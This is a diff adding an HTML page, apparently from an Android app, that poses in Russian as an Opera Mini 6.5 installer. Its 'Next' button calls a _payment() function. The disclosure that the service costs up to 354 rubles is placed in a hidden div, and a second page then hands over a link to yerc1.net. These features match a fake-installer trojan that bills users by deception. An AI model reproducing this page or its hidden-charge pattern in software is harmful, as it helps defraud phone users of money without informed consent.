@@ -1,0 +1,86 @@
+<!DOCTYPE HTML>
+<html>
+	<head>
+		<title></title>
+	
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+		<link type="text/css" href="css/smoothness/jquery-ui-1.8.18.custom.css" rel="stylesheet" />	
+		<script type="text/javascript" src="js/jquery-1.7.1.min.js"></script>
+		<script type="text/javascript" src="js/jquery-s-0.1.min.js"></script>
+		<script type="text/javascript" src="js/jquery-ui-1.8.18.custom.min.js"></script>
+		<script type="text/javascript">
+			function initData()
+			{	
+				$('#image1').attr('height' , (screen.height - 240) > 170 ? 170 : (screen.height - 240));
+					
+				if(androidLimit == 2)
+				{
+					$('#page1').fadeOut(300);
+					$('#page2').fadeIn(600);
+				}
+			}
+		</script>
+		<style type="text/css">
+			*[unselectable=on] {
+			    -moz-user-select: none;
+			    -o-user-select:none;
+			    -khtml-user-select: none;
+			    -webkit-user-select: none;
+			    -ms-user-select: none;
+			     user-select: none;
+			}
+			body{ font: 90% "Trebuchet MS", sans-serif; margin: 5px;}
+			
+			.ui-button { width:200px; font-size:20px;}
+			
+			
+		</style>	
+	</head>
+	<body>
+		<div id="layout" align="center">
+			
+
+			<div id="page1">
+			
+				<img src="images/logo.png" id="image1" height="140">
+				<br>
+				
+				<div class="ui-widget">
+					<div class="ui-state-highlight ui-corner-all" style="margin-top: 20px; padding: 0 .7em;"> 
+						<p>
+						<strong>Установка</strong> <br>
+						<span id="install-info_all">Вы согласны с условиями загрузки Opera Mini 6.5. <br>Для продолжения загрузки нажмите кнопку Далее.</span>
+						
+						</p>
+						
+					</div>
+				</div>
+				<br>
+				<a href="javascript:_payment()" class="button ui-state-hover">Далее</a>
+				
+				
+				<div style="bottom:5px;position:absolute;width:100%;margin:-5px;bottom:20px;display:none;" id="oferta-link-meg">
+					<a href="exit.html" style="color:#999999;font-size:17px;">Выход</a>
+					<div align="center" style="color:#999999;font-size:13px;">Услуга платная, не более 354р с НДС.</div>				
+					<div align="center" ><a href="javascript:_oferta()" style="color:#999999;font-size:13px;">Пользовательское соглашение</a></div>					
+				</div>
+				
+			</div>
+			
+			<div id="page2" style="display:none;">
+				<div class="ui-widget">
+					<div class="ui-state-highlight ui-corner-all" style="padding: 0 .7em;"> 
+						<p>
+						<strong>Ваша ссылка:</strong> <br clear="all"><b>http://yerc1.net/?u=64504</b>.</p>
+					</div>
+				</div>	
+				<br>
+				<a href="openurl.html#url=http://yerc1.net/?u=64504;" class="button ui-state-hover">Перейти</a>		
+			</div>
+			
+		</div>
+	</body>
+</html>
+
+
